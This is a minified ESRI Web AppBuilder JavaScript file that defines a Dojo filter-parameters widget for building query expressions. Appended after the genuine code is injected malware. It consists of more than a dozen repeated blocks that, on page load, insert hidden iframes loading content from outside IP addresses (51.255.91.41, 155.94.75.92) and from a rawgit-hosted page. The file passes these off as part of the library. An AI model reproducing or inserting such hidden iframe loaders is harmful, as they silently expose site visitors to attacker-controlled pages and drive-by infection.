// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/on dojo/Evented dojo/Deferred dojo/promise/all dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/_base/lang dojo/_base/html dojo/_base/array dojo/query dijit/registry jimu/filterUtils jimu/utils ./_SingleFilterParameter ./_filter/ValueProviderFactory".split(" "),function(p,q,r,t,u,v,w,x,f,m,k,n,y,z,A,B,C){return u([v,w,x,q],{baseClass:"jimu-filter-parameters",templateString:'\x3cdiv\x3e\x3ctable style\x3d"width:100%;border-collapse:collapse;"\x3e\x3ctbody data-dojo-attach-point\x3d"tbody"\x3e\x3c/tbody\x3e\x3c/table\x3e\x3c/div\x3e',
_filterUtils:null,_spObj:null,nls:null,partsObj:null,layerInfo:null,OPERATORS:null,url:null,featureLayerId:null,postMixInProperties:function(){this.nls=window.jimuNls.filterBuilder;this._filterUtils=new z;this.OPERATORS=f.clone(this._filterUtils.OPERATORS);this._spObj={}},destroy:function(){this.clear();this._filterUtils=null;this.inherited(arguments)},getFilterExpr:function(){var a=this._getNewValidPartsObj(this.partsObj,!0);return a?this._getFilterExprByPartsObj(a):null},getValueProviders:function(){for(var a=
[],c=this._getAllInteractiveSinglePartArray(this.partsObj),b=0;b<c.length;b++){var e=c[b].spId;e&&(e=this._getSingleFilterParameterBySpId(e),a.push(e))}return a},_getNewValidPartsObj:function(a,c){a=f.clone(a);for(var b={logicalOperator:a.logicalOperator,parts:[]},e=f.hitch(this,function(a){if(a.spId){var b=this._getSingleFilterParameterBySpId(a.spId);a.valueObj=b.getValueObject();return b.getStatus()}return a.valueObj?1:-1}),d=f.hitch(this,function(a){var c=e(a);0<c&&b.parts.push(a);return c}),g=
f.hitch(this,function(a){var c=[];a.parts=k.filter(a.parts,f.hitch(this,function(a){a=e(a);c.push(a);return 0<a}));1===a.parts.length?b.parts.push(a.parts[0]):2<=a.parts.length&&b.parts.push(a);return Math.min.apply(c,c)}),h=0;h<a.parts.length;h++){var l=a.parts[h];if(l.parts){if(0>g(l)&&c)return null}else if(0>d(l)&&c)return null}return b},_getFilterExprByPartsObj:function(a){this._filterUtils.isHosted=A.isHostedService(this.url);return this._filterUtils.getExprByFilterObj(a)},_getSingleFilterParameterBySpId:function(a){return this._spObj[a]},
_getCascadeFilterExpr:function(a){var c="1\x3d1",b={logicalOperator:this.partsObj.logicalOperator,parts:[]},e=f.clone(this.partsObj),d,g,h;d="none";a.interactiveObj&&a.interactiveObj.cascade&&(d=a.interactiveObj.cascade);if("previous"===d)for(d=0;d<e.parts.length;d++)g=e.parts[d],g.majorCascadeIndex<a.majorCascadeIndex?b.parts.push(g):g.parts&&g.majorCascadeIndex===a.majorCascadeIndex&&(h=f.clone(g),h.parts=k.filter(h.parts,f.hitch(this,function(c){return c.minorCascadeIndex<a.minorCascadeIndex})),
b.parts.push(h));else if("all"===d)for(d=0;d<e.parts.length;d++)g=e.parts[d],g.majorCascadeIndex!==a.majorCascadeIndex?b.parts.push(g):g.majorCascadeIndex===a.majorCascadeIndex&&g.parts&&(h=f.clone(g),k.some(g.parts,f.hitch(this,function(c){return c.spId===a.spId}))&&(h.parts=k.filter(h.parts,f.hitch(this,function(c){return c.minorCascadeIndex!==a.minorCascadeIndex})),b.parts.push(h)));(b=this._getNewValidPartsObj(b,!1))&&(c=this._getFilterExprByPartsObj(b));c||(c="1\x3d1");return c},clear:function(){this.featureLayerId=
this.url=null;var a=n(".jimu-widget-query-single-parameter",this.tbody);k.forEach(a,f.hitch(this,function(a){y.byNode(a).destroy()}));m.empty(this.tbody);this.layerInfo=this.partsObj=null},build:function(a,c,b,e){var d=new r;this.clear();this.url=a;this.layerInfo=c;this.partsObj=f.clone(b);this.partsObj=this._updatePartsObj(this.partsObj);this.featureLayerId=e;this._setCascadeIndexForPartsObj(this.partsObj);a=this._getAllInteractiveSinglePartArray(this.partsObj);if(0<a.length){var g=new C({url:this.url,
layerDefinition:c,featureLayerId:this.featureLayerId});a=k.map(a,f.hitch(this,function(a){var b=m.create("tr",{innerHTML:"\x3ctd\x3e\x3c/td\x3e"},this.tbody),b=n("td",b)[0],d=this._getFieldInfo(a.fieldObj.name,this.layerInfo),d=new B({nls:this.nls,url:this.url,layerDefinition:c,fieldInfo:d,part:a,valueProviderFactory:g});this.own(p(d,"change",f.hitch(this,this._onSingleFilterParameterChanged)));d.placeAt(b);d.startup();a.spId=d.id;return this._spObj[d.id]=d}));k.forEach(a,f.hitch(this,function(a){a.valueProvider.getCascadeFilterExpr=
f.hitch(this,this._getCascadeFilterExpr,a.part)}));a=k.map(a,f.hitch(this,function(a){return a.init()}));t(a).then(f.hitch(this,function(){d.resolve()}),f.hitch(this,function(){d.reject()}))}else d.resolve();return d},_updatePartsObj:function(a){k.forEach(a,f.hitch(this,function(a){a.parts?k.forEach(a.parts,f.hitch(this,function(a){a.interactiveObj&&!0===a.interactiveObj.cascade?a.interactiveObj.cascade="previous":!1===a.interactiveObj.cascade&&(a.interactiveObj.cascade="none")})):a.interactiveObj&&
!0===a.interactiveObj.cascade?a.interactiveObj.cascade="previous":!1===a.interactiveObj.cascade&&(a.interactiveObj.cascade="none")}));return a},_setCascadeIndexForPartsObj:function(a){for(var c=0;c<a.parts.length;c++){var b=a.parts[c];b.majorCascadeIndex="AND"===a.logicalOperator?c:0;b.minorCascadeIndex=0;b.cascadeIndex=b.majorCascadeIndex;if(b.parts)for(var e=0;e<b.parts.length;e++){var d=b.parts[e];d.majorCascadeIndex=b.majorCascadeIndex;d.minorCascadeIndex="AND"===b.logicalOperator?e:0;d.cascadeIndex=
parseFloat(d.majorCascadeIndex+"."+d.minorCascadeIndex)}}},_getFieldInfo:function(a,c){c=c.fields;for(var b=0;b<c.length;b++){var e=c[b];if(a===e.name)return e}return null},_getAllInteractiveSinglePartArray:function(a){for(var c=[],b=0;b<a.parts.length;b++){var e=a.parts[b];if(e.parts)for(var d=0;d<e.parts.length;d++){var f=e.parts[d];f.interactiveObj&&c.push(f)}else e.interactiveObj&&c.push(e)}return c},_onSingleFilterParameterChanged:function(){this.emit("change",this.getFilterExpr(!1))}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});